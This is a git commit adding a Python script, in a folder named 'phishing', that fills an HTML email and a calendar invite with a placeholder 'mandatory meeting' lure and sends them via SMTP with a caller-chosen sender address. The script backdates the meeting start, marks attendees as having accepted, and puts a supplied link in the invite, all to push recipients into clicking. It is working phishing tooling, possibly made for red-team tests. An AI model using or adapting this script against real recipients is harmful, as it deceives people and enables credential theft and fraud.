03adcd711cd52dfd69db8c48a9bc864b71ed0a88
Eugene Kong <95288169+violin-ing@users.noreply.github.com>
2026-05-31 10:19:00 +0100

    Create edit_and_send.py

---
+++ phishing/edit_and_send.py
@@ -0,0 +1,153 @@
+# THIS PYTHON SCRIPT WILL EDIT THE PHISHING TEMPLATE FILES AND SEND THEM
+# EXAMPLE USAGE: python3 edit_and_send.py <SMTP_SERVER_IP> <SENDER_EMAIL> <RECEIVER_EMAIL> <>
+
+import time
+import codecs
+import smtplib
+import datetime
+import sys
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email.encoders import encode_base64
+from email.mime.multipart import MIMEMultipart
+from email.utils import COMMASPACE, formatdate
+
+# EDIT THIS PART
+EMAIL_SUBJECT = "Poop Meeting"
+
+# EDIT THIS PART
+EVENT_SUMMARY = "Poop meeting for all employees"
+
+# EDIT THIS PART
+ORGANIZER_NAME = "Poop Enforcer Team 1"
+ATTENDEES = ["ceo@poop.com", "cto@poop.com"]
+
+# EDIT THIS PART
+EVENT_TEXT = """
+Dear employee,
+
+We would like to inform you about an important poop meeting regarding recent company-wide changes and policies. Your attendance is MANDATORY as we will be discussing essential updates that impact all employees' poop policies.
+
+Topics will include:
+
+- Pooping schedules
+- Pooping quotas
+- Updates to pooping during leave days
+
+This meeting is of utmost urgency and will be your opportunity to ask any questions or raise concerns regarding the new company poop policies.
+
+We look forward to your participation and eager pooping.
+
+Best regards,
+Poop Manager
+"""
+
+def load_template():
+    template = ""
+    with codecs.open("template.html", 'r', 'utf-8') as f:
+        template = f.read()
+    return template
+
+
+def prepare_template(event_url):
+    email_template = load_template()
+    email_template = email_template.format(EVENT_TEXT=EVENT_TEXT, EVENT_URL=event_url)
+    return email_template
+
+
+def load_ics():
+    ics = ""
+    with codecs.open("template.ics", 'r', 'utf-8') as f:
+        ics = f.read()
+    return ics
+
+
+def prepare_ics(dtstamp, dtstart, dtend, sender_email, event_url):
+    ics_template = load_ics()
+    ics_template = ics_template.format(
+        DTSTAMP=dtstamp,
+        DTSTART=dtstart,
+        DTEND=dtend,
+        ORGANIZER_NAME=ORGANIZER_NAME,
+        ORGANIZER_EMAIL=sender_email,
+        DESCRIPTION=event_url,  # Use event_url as DESCRIPTION
+        SUMMARY=EVENT_SUMMARY,
+        ATTENDEES=generate_attendees()
+    )
+    return ics_template
+
+
+def generate_attendees():
+    attendees = []
+    for attendee in ATTENDEES:
+        attendees.append(
+            "ATTENDEE;CUTYPE=INDIVIDUAL;ROLE=REQ-PARTICIPANT;PARTSTAT=ACCEPTED;RSVP=FALSE\r\n ;CN={attendee};X-NUM-GUESTS=0:\r\n mailto:{attendee}".format(attendee=attendee)
+        )
+    return "\r\n".join(attendees)
+
+
+def send_email(smtp_server, sender_email, to, event_url):
+    print('Sending email to: ' + to)
+
+    # in .ics file timezone is set to be utc
+    utc_offset = time.localtime().tm_gmtoff / 60
+    ddtstart = datetime.datetime.now()
+    dtoff = datetime.timedelta(minutes=utc_offset + 5)  # meeting has started 5 minutes ago
+    duration = datetime.timedelta(hours=1)  # meeting duration
+    ddtstart = ddtstart - dtoff
+    dtend = ddtstart + duration
+    dtstamp = datetime.datetime.now().strftime("%Y%m%dT%H%M%SZ")
+    dtstart = ddtstart.strftime("%Y%m%dT%H%M%SZ")
+    dtend = dtend.strftime("%Y%m%dT%H%M%SZ")
+
+    ics = prepare_ics(dtstamp, dtstart, dtend, sender_email, event_url)
+    email_body = prepare_template(event_url)
+
+    msg = MIMEMultipart('mixed')
+    msg['Reply-To'] = sender_email
+    msg['Date'] = formatdate(localtime=True)
+    msg['Subject'] = EMAIL_SUBJECT
+    msg['From'] = sender_email
+    msg['To'] = to
+
+    part_email = MIMEText(email_body, "html")
+    part_cal = MIMEText(ics, 'calendar;method=REQUEST')
+
+    msgAlternative = MIMEMultipart('alternative')
+    msg.attach(msgAlternative)
+
+    ics_atch = MIMEBase('application/ics', ' ;name="%s"' % ("invite.ics"))
+    ics_atch.set_payload(ics)
+    encode_base64(ics_atch)
+    ics_atch.add_header('Content-Disposition', 'attachment; filename="%s"' % ("invite.ics"))
+
+    eml_atch = MIMEBase('text/plain', '')
+    eml_atch.set_payload("")
+    encode_base64(eml_atch)
+    eml_atch.add_header('Content-Transfer-Encoding', "")
+
+    msgAlternative.attach(part_email)
+    msgAlternative.attach(part_cal)
+
+    mailServer = smtplib.SMTP(smtp_server, 25)
+    mailServer.ehlo()
+    mailServer.ehlo()
+    mailServer.sendmail(sender_email, to, msg.as_string())
+    mailServer.close()
+
+
+def main():
+    if len(sys.argv) != 5:
+        print("Usage: python poop.py <smtp_server> <sender_email> <recipient_email> <event_url>")
+        sys.exit(1)
+
+    smtp_server = sys.argv[1]
+    sender_email = sys.argv[2]
+    recipient_email = sys.argv[3]
+    event_url = sys.argv[4]
+
+    send_email(smtp_server, sender_email, recipient_email, event_url)
+
+
+if __name__ == "__main__":
+    main()
